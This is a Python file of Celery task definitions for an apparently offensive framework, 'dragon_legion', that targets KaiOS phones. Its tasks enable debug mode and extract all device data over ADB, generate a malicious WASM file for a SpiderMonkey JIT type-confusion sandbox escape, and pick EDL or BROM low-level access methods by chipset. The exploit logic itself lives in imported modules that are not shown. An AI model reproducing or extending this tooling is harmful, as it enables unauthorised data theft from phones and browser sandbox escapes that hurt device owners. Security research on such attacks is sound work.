"""Celery tasks for KaiOS attack modules."""

from celery import shared_task
from celery.utils.log import get_task_logger

logger = get_task_logger(__name__)


@shared_task(bind=True, max_retries=2)
def execute_kaios_debug(self, attack_id: str, device_id: str,
                        attack_vector: str, params: dict) -> dict:
    """Enable KaiOS debug mode and extract data."""
    logger.info("Accessing KaiOS debug for device %s", device_id)
    from dragon_legion.modules.kaios import KaiOSDebugProtocol

    kaios = KaiOSDebugProtocol()
    kaios.enable_debug()
    if kaios.connect_adb():
        results = kaios.extract_all_data(output_dir=params.get("output_dir", "kaios_extract"))
        return {
            "attack_id": attack_id,
            "status": "completed",
            "module": "kaios_debug",
            "extracted": results,
        }
    return {"attack_id": attack_id, "status": "failed", "module": "kaios_debug", "error": "ADB not connected"}


@shared_task(bind=True, max_retries=2)
def execute_wasm_sandbox_escape(self, attack_id: str, device_id: str,
                                attack_vector: str, params: dict) -> dict:
    """Generate malicious WASM for SpiderMonkey JIT type confusion."""
    logger.info("Generating WASM exploit for device %s", device_id)
    from dragon_legion.modules.kaios import WasmJITExploit

    gen = WasmJITExploit()
    wasm = gen.generate_malicious_wasm()
    output_path = params.get("output", "exploit.wasm")
    with open(output_path, "wb") as f:
        f.write(wasm)

    return {
        "attack_id": attack_id,
        "status": "completed",
        "module": "kaios_wasm",
        "wasm_size": len(wasm),
        "output": output_path,
    }


@shared_task(bind=True, max_retries=2)
def execute_kaios_edl_brom(self, attack_id: str, device_id: str,
                           attack_vector: str, params: dict) -> dict:
    """Route KaiOS device to appropriate EDL or BROM method."""
    logger.info("Routing KaiOS chipset for device %s", device_id)
    from dragon_legion.modules.kaios import KaiOSChipsetAccess

    model = params.get("model", "")
    access = KaiOSChipsetAccess(model=model)
    method = access.detect_method()

    return {
        "attack_id": attack_id,
        "status": "completed",
        "module": "kaios_edl_brom",
        "model": model,
        "method": method,
    }
